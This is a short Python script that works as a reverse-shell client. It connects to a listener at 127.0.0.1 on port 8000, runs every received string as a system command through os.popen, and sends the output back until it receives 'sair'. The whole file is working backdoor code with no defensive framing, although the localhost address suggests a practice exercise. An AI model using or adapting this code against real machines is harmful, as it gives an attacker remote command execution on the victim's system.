import socket
import os

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
    try:
        client.connect(("127.0.0.1", 8000))

        while True:
            dados = client.recv(2048).decode()
            if dados == "sair":
                break
            return_command = os.popen(dados).read()
            client.sendall(return_command.encode())

    except Exception as msg:
        print(msg)

    finally:
        client.close()
